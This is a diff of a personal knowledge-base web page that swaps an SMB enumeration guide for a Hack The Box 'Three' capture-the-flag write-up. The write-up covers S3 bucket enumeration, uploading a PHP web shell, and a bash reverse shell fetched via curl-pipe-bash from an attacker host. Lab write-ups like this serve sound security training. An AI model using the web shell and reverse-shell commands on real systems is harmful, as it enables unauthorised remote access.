@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../shell/">
+        <link rel="prev" href="../wpexplo/">
       
       
-        <link rel="next" href="../ssh/">
+        <link rel="next" href="../create/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>SMB (Server Message Block) - My Knowledge Base</title>
+        <title>Three - S3 Reverse Shell - My Knowledge Base</title>
       
     
     
@@ -70,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#smb-server-message-block-port-139-445" class="md-skip">
+        <a href="#exploiting-an-amazon-s3-bucket-for-a-reverse-shell" class="md-skip">
           Skip to content
         </a>
       
@@ -106,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              SMB (Server Message Block)
+              Three - S3 Reverse Shell
             
           </span>
         </div>
@@ -574,31 +574,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    SMB (Server Message Block)
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../smb/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -608,185 +587,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#introduction-to-smb" class="md-nav__link">
-    <span class="md-ellipsis">
-      Introduction to SMB
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Introduction to SMB">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#ports-used-by-smb" class="md-nav__link">
-    <span class="md-ellipsis">
-      Ports Used by SMB:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#common-use-cases" class="md-nav__link">
-    <span class="md-ellipsis">
-      Common Use Cases:
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumerating-smb-shares" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enumerating SMB Shares
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Enumerating SMB Shares">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#listing-smb-shares" class="md-nav__link">
-    <span class="md-ellipsis">
-      Listing SMB Shares
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#breakdown" class="md-nav__link">
-    <span class="md-ellipsis">
-      Breakdown:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#accessing-an-smb-share-anonymously" class="md-nav__link">
-    <span class="md-ellipsis">
-      Accessing an SMB Share Anonymously:
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#additional-smb-enumeration-exploitation-tools" class="md-nav__link">
-    <span class="md-ellipsis">
-      Additional SMB Enumeration &amp; Exploitation Tools
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Additional SMB Enumeration & Exploitation Tools">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#nmap-smb-scripts" class="md-nav__link">
-    <span class="md-ellipsis">
-      Nmap SMB Scripts
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#enum4linux-smb-enumeration-on-linux" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enum4Linux (SMB Enumeration on Linux)
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#checking-smb-version-vulnerabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      Checking SMB Version &amp; Vulnerabilities
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#smb-exploits-security-concerns" class="md-nav__link">
-    <span class="md-ellipsis">
-      SMB Exploits &amp; Security Concerns
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="SMB Exploits & Security Concerns">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#common-smb-exploits" class="md-nav__link">
-    <span class="md-ellipsis">
-      Common SMB Exploits:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#securing-smb" class="md-nav__link">
-    <span class="md-ellipsis">
-      Securing SMB:
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusion
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -837,17 +637,19 @@
       
   
   
+    
   
   
+  
     
     
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" checked>
         
           
           <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
@@ -862,7 +664,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_22">
             <span class="md-nav__icon md-icon"></span>
             HTB
@@ -873,10 +675,31 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../threeawsshell/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Three - S3 Reverse Shell
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -886,6 +709,296 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scanning-the-target-with-nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scanning the Target with Nmap
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scanning the Target with Nmap">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key Findings:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#virtual-host-enumeration-with-gobuster" class="md-nav__link">
+    <span class="md-ellipsis">
+      Virtual Host Enumeration with Gobuster
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Virtual Host Enumeration with Gobuster">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovered-subdomains" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovered Subdomains:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-aws-s3-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation: AWS S3 Misconfiguration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation: AWS S3 Misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#configuring-aws-cli-to-interact-with-the-bucket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuring AWS CLI to Interact with the Bucket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#listing-available-buckets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listing Available Buckets
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Listing Available Buckets">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#found-bucket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Found Bucket:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploring-the-contents-of-the-s3-bucket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploring the Contents of the S3 Bucket
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploring the Contents of the S3 Bucket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#retrieved-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Retrieved Files:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-a-web-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Web Shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gaining-a-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gaining a Reverse Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Gaining a Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-a-netcat-listener" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up a Netcat Listener
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preparing-the-reverse-shell-script" class="md-nav__link">
+    <span class="md-ellipsis">
+      Preparing the Reverse Shell Script
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#triggering-the-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Triggering the Reverse Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Triggering the Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#listener-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listener Output:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirming-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirming Access
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post-Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploring-the-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploring the System
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#capturing-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Capturing the Flag
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Host Mapping
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1056,28 +1169,148 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#introduction-to-smb" class="md-nav__link">
+  <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      Introduction to SMB
+      Introduction
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Introduction to SMB">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#ports-used-by-smb" class="md-nav__link">
+  <a href="#scanning-the-target-with-nmap" class="md-nav__link">
     <span class="md-ellipsis">
-      Ports Used by SMB:
+      Scanning the Target with Nmap
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scanning the Target with Nmap">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      Key Findings:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#virtual-host-enumeration-with-gobuster" class="md-nav__link">
+    <span class="md-ellipsis">
+      Virtual Host Enumeration with Gobuster
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Virtual Host Enumeration with Gobuster">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovered-subdomains" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovered Subdomains:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-aws-s3-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation: AWS S3 Misconfiguration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation: AWS S3 Misconfiguration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#configuring-aws-cli-to-interact-with-the-bucket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuring AWS CLI to Interact with the Bucket
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#common-use-cases" class="md-nav__link">
+  <a href="#listing-available-buckets" class="md-nav__link">
     <span class="md-ellipsis">
-      Common Use Cases:
+      Listing Available Buckets
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Listing Available Buckets">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#found-bucket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Found Bucket:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploring-the-contents-of-the-s3-bucket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploring the Contents of the S3 Bucket
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploring the Contents of the S3 Bucket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#retrieved-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Retrieved Files:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-a-web-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Web Shell
     </span>
   </a>
   
@@ -1089,37 +1322,61 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#enumerating-smb-shares" class="md-nav__link">
+  <a href="#gaining-a-reverse-shell" class="md-nav__link">
     <span class="md-ellipsis">
-      Enumerating SMB Shares
+      Gaining a Reverse Shell
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Enumerating SMB Shares">
+    <nav class="md-nav" aria-label="Gaining a Reverse Shell">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#listing-smb-shares" class="md-nav__link">
+  <a href="#setting-up-a-netcat-listener" class="md-nav__link">
     <span class="md-ellipsis">
-      Listing SMB Shares
+      Setting Up a Netcat Listener
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#breakdown" class="md-nav__link">
+  <a href="#preparing-the-reverse-shell-script" class="md-nav__link">
     <span class="md-ellipsis">
-      Breakdown:
+      Preparing the Reverse Shell Script
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#accessing-an-smb-share-anonymously" class="md-nav__link">
+  <a href="#triggering-the-reverse-shell" class="md-nav__link">
     <span class="md-ellipsis">
-      Accessing an SMB Share Anonymously:
+      Triggering the Reverse Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Triggering the Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#listener-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listener Output:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirming-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirming Access
     </span>
   </a>
   
@@ -1131,37 +1388,28 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#additional-smb-enumeration-exploitation-tools" class="md-nav__link">
+  <a href="#post-exploitation" class="md-nav__link">
     <span class="md-ellipsis">
-      Additional SMB Enumeration &amp; Exploitation Tools
+      Post-Exploitation
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Additional SMB Enumeration & Exploitation Tools">
+    <nav class="md-nav" aria-label="Post-Exploitation">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#nmap-smb-scripts" class="md-nav__link">
+  <a href="#exploring-the-system" class="md-nav__link">
     <span class="md-ellipsis">
-      Nmap SMB Scripts
+      Exploring the System
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#enum4linux-smb-enumeration-on-linux" class="md-nav__link">
+  <a href="#capturing-the-flag" class="md-nav__link">
     <span class="md-ellipsis">
-      Enum4Linux (SMB Enumeration on Linux)
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#checking-smb-version-vulnerabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      Checking SMB Version &amp; Vulnerabilities
+      Capturing the Flag
     </span>
   </a>
   
@@ -1173,35 +1421,11 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#smb-exploits-security-concerns" class="md-nav__link">
+  <a href="#host-mapping" class="md-nav__link">
     <span class="md-ellipsis">
-      SMB Exploits &amp; Security Concerns
+      Host Mapping
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="SMB Exploits & Security Concerns">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#common-smb-exploits" class="md-nav__link">
-    <span class="md-ellipsis">
-      Common SMB Exploits:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#securing-smb" class="md-nav__link">
-    <span class="md-ellipsis">
-      Securing SMB:
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -1230,98 +1454,119 @@
 
 
 
-<h1 id="smb-server-message-block-port-139-445">SMB (Server Message Block) - Port 139 &amp; 445</h1>
-<h2 id="introduction-to-smb">Introduction to SMB</h2>
-<p><strong>SMB (Server Message Block)</strong> is a <strong>network file sharing protocol</strong> that allows applications or users to read and write files over a network. It enables <strong>file sharing, printer sharing, and remote access</strong> to Windows-based resources. SMB operates mainly over <strong>port 139 (NetBIOS) and port 445 (Direct TCP/IP)</strong>.</p>
-<h3 id="ports-used-by-smb"><strong>Ports Used by SMB:</strong></h3>
+<h1 id="exploiting-an-amazon-s3-bucket-for-a-reverse-shell">Exploiting an Amazon S3 Bucket for a Reverse Shell</h1>
+<h2 id="introduction">Introduction</h2>
+<p>This guide covers the process of <strong>enumerating, exploiting, and gaining a reverse shell</strong> on a system using an <strong>Amazon S3 bucket</strong>. By leveraging <strong>AWS misconfigurations</strong>, we can upload a web shell and execute commands remotely to gain shell access.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scanning-the-target-with-nmap">Scanning the Target with Nmap</h3>
+<pre><code class="language-bash">nmap -sV -A 10.129.99.11
+</code></pre>
+<h4 id="key-findings">Key Findings:</h4>
 <ul>
-<li><strong>Port 139</strong>: Used for SMB communication over NetBIOS.</li>
-<li><strong>Port 445</strong>: Used for SMB communication directly over TCP/IP (modern implementations).</li>
+<li><strong>SSH (22/tcp) running OpenSSH 7.6p1</strong></li>
+<li><strong>HTTP (80/tcp) running Apache 2.4.29</strong></li>
+<li>Target OS: <strong>Linux Kernel 5.X</strong></li>
 </ul>
-<h3 id="common-use-cases"><strong>Common Use Cases:</strong></h3>
+<h3 id="virtual-host-enumeration-with-gobuster">Virtual Host Enumeration with Gobuster</h3>
+<pre><code class="language-bash">gobuster vhost -u http://thetoppers.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+</code></pre>
+<h4 id="discovered-subdomains">Discovered Subdomains:</h4>
 <ul>
-<li>File and folder sharing between <strong>Windows and Linux systems</strong>.</li>
-<li>Authentication and access control for shared resources.</li>
-<li>Network-based <strong>privilege escalation and exploitation</strong> in penetration testing.</li>
+<li><code>s3.thetoppers.htb</code></li>
+<li><code>gc._msdcs.thetoppers.htb</code></li>
 </ul>
+<p>Upon visiting <code>http://s3.thetoppers.htb/</code>, the response returned:</p>
+<pre><code class="language-json">{&quot;status&quot;: &quot;running&quot;}
+</code></pre>
+<p>This suggests an <strong>Amazon S3 bucket hosting content</strong>.</p>
 <hr />
-<h2 id="enumerating-smb-shares">Enumerating SMB Shares</h2>
-<p>To discover <strong>shared folders</strong>, we can use <strong>smbclient</strong> (a command-line tool for SMB access) to list available shares on a target system.</p>
-<h3 id="listing-smb-shares"><strong>Listing SMB Shares</strong></h3>
-<pre><code class="language-bash">smbclient -L \\192.168.0.0\ADMIN$
+<h2 id="exploitation-aws-s3-misconfiguration">Exploitation: AWS S3 Misconfiguration</h2>
+<h3 id="configuring-aws-cli-to-interact-with-the-bucket">Configuring AWS CLI to Interact with the Bucket</h3>
+<pre><code class="language-bash">aws configure
 </code></pre>
-<h3 id="breakdown"><strong>Breakdown:</strong></h3>
-<ul>
-<li><strong><code>smbclient</code></strong> → The tool used to interact with SMB shares.</li>
-<li><strong><code>-L</code></strong> → Lists all available shares on the specified server.</li>
-<li><strong><code>\\192.168.0.0\ADMIN$</code></strong> → The target <strong>IP address</strong> and <strong>share name</strong> (in this case, <code>ADMIN$</code>, a hidden administrative share).</li>
-</ul>
-<p><strong>Example Output:</strong>
-``` Sharename       Type      Comment
-    ---------       ----      -------
-    ADMIN$         Disk      Remote Admin
-    C$             Disk      Default share
-    IPC$           IPC       Remote IPC</p>
-<pre><code>
----
-
-##  SMB Anonymous Access
-Some SMB servers allow **unauthenticated (anonymous) access**, meaning that no username or password is required to view or access shared resources.
-
-### **Checking for Anonymous SMB Access:**
-```bash
-smbclient -L \\192.168.0.0\ -N
+<p>Enter temporary credentials (placeholders used):</p>
+<pre><code class="language-bash">AWS Access Key ID [None]: temp
+AWS Secret Access Key [None]: temp
+Default region name [None]: temp
+Default output format [None]: temp
 </code></pre>
-<ul>
-<li><strong><code>-N</code></strong> → Disables password prompt (attempts to access SMB shares without authentication).</li>
-<li>If anonymous access is <strong>enabled</strong>, the shares may be listed and <strong>publicly accessible</strong>.</li>
-</ul>
-<h3 id="accessing-an-smb-share-anonymously"><strong>Accessing an SMB Share Anonymously:</strong></h3>
-<pre><code class="language-bash">smbclient \\192.168.0.0\public -N
+<h3 id="listing-available-buckets">Listing Available Buckets</h3>
+<pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb s3 ls
 </code></pre>
-<ul>
-<li>If successful, you'll get an <strong>SMB interactive shell</strong> where you can navigate and download files:
-  <code>smb: \&gt; ls
-  smb: \&gt; get important_document.txt</code></li>
-</ul>
-<hr />
-<h2 id="additional-smb-enumeration-exploitation-tools">Additional SMB Enumeration &amp; Exploitation Tools</h2>
-<h3 id="nmap-smb-scripts"><strong>Nmap SMB Scripts</strong></h3>
-<p>Nmap has built-in scripts for <strong>SMB enumeration</strong> and <strong>vulnerability detection</strong>.</p>
-<pre><code class="language-bash">nmap -p 139,445 --script=smb-enum-shares,smb-enum-users 192.168.0.0
+<h4 id="found-bucket">Found Bucket:</h4>
+<pre><code>2025-02-10 12:05:02 thetoppers.htb
 </code></pre>
-<ul>
-<li><strong><code>smb-enum-shares</code></strong> → Lists shared folders.</li>
-<li><strong><code>smb-enum-users</code></strong> → Enumerates SMB users.</li>
-</ul>
-<h3 id="enum4linux-smb-enumeration-on-linux"><strong>Enum4Linux (SMB Enumeration on Linux)</strong></h3>
-<pre><code class="language-bash">enum4linux -a 192.168.0.0
+<h3 id="exploring-the-contents-of-the-s3-bucket">Exploring the Contents of the S3 Bucket</h3>
+<pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 </code></pre>
-<ul>
-<li>Gathers <strong>user accounts, shares, group memberships, and policies</strong>.</li>
-</ul>
-<h3 id="checking-smb-version-vulnerabilities"><strong>Checking SMB Version &amp; Vulnerabilities</strong></h3>
-<pre><code class="language-bash">smbclient -V  # Displays installed SMB client version
-nmap --script smb-vuln* -p 139,445 192.168.0.0  # Checks for known SMB vulnerabilities
+<h4 id="retrieved-files">Retrieved Files:</h4>
+<pre><code>PRE images/
+2025-02-10 12:05:02  0 .htaccess
+2025-02-10 12:05:02  11952 index.php
+</code></pre>
+<h3 id="uploading-a-web-shell">Uploading a Web Shell</h3>
+<p>To execute remote commands, we create and upload a simple PHP shell:</p>
+<pre><code class="language-bash">echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+</code></pre>
+<p>Verify the upload:</p>
+<pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+</code></pre>
+<pre><code>PRE images/
+2025-02-10 12:05:02  0 .htaccess
+2025-02-10 12:05:02  11952 index.php
+2025-02-10 14:30:15  31 shell.php
 </code></pre>
 <hr />
-<h2 id="smb-exploits-security-concerns">SMB Exploits &amp; Security Concerns</h2>
-<h3 id="common-smb-exploits"><strong>Common SMB Exploits:</strong></h3>
-<ul>
-<li><strong>SMB Null Sessions</strong> (unauthorized access to shared resources).</li>
-<li><strong>EternalBlue (MS17-010)</strong> → Remote code execution vulnerability in older SMB versions.</li>
-<li><strong>Relay Attacks</strong> (Intercepting SMB authentication for lateral movement).</li>
-</ul>
-<h3 id="securing-smb"><strong>Securing SMB:</strong></h3>
-<ul>
-<li><strong>Disable SMBv1</strong> (Older versions are vulnerable to exploits like EternalBlue).</li>
-<li><strong>Enforce authentication</strong> for accessing shares.</li>
-<li><strong>Limit SMB access</strong> to trusted IPs and networks.</li>
-<li><strong>Use strong credentials</strong> and disable anonymous access.</li>
-</ul>
+<h2 id="gaining-a-reverse-shell">Gaining a Reverse Shell</h2>
+<h3 id="setting-up-a-netcat-listener">Setting Up a Netcat Listener</h3>
+<pre><code class="language-bash">nc -nvlp 1337
+</code></pre>
+<h3 id="preparing-the-reverse-shell-script">Preparing the Reverse Shell Script</h3>
+<pre><code class="language-bash">echo &quot;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.16.29/1337 0&gt;&amp;1&quot; &gt; shell.sh
+python3 -m http.server 8000
+</code></pre>
+<h3 id="triggering-the-reverse-shell">Triggering the Reverse Shell</h3>
+<p>Accessing the uploaded PHP shell:</p>
+<pre><code class="language-bash">http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.29:8000/shell.sh|bash
+</code></pre>
+<h4 id="listener-output">Listener Output:</h4>
+<pre><code>connect to [10.10.16.29] from (UNKNOWN) [10.129.99.11] 50664
+bash: cannot set terminal process group (1486): Inappropriate ioctl for device
+bash: no job control in this shell
+</code></pre>
+<h3 id="confirming-access">Confirming Access</h3>
+<pre><code class="language-bash">whoami
+ls -la
+</code></pre>
+<p>We have successfully obtained a shell with <code>www-data</code> privileges.</p>
+<hr />
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<h3 id="exploring-the-system">Exploring the System</h3>
+<pre><code class="language-bash">cd /var/www/html
+ls
+</code></pre>
+<p>Discovered files:</p>
+<pre><code>images
+index.php
+shell.php
+</code></pre>
+<h3 id="capturing-the-flag">Capturing the Flag</h3>
+<pre><code class="language-bash">cd /var/www/
+cat flag.txt
+</code></pre>
+<pre><code>a980d99281a28d638ac68b9bf9453c2b
+</code></pre>
+<hr />
+<h2 id="host-mapping">Host Mapping</h2>
+<p>To ensure the target domain resolves correctly, modify <code>/etc/hosts</code>:</p>
+<pre><code class="language-bash">echo &quot;10.129.99.11 s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts  
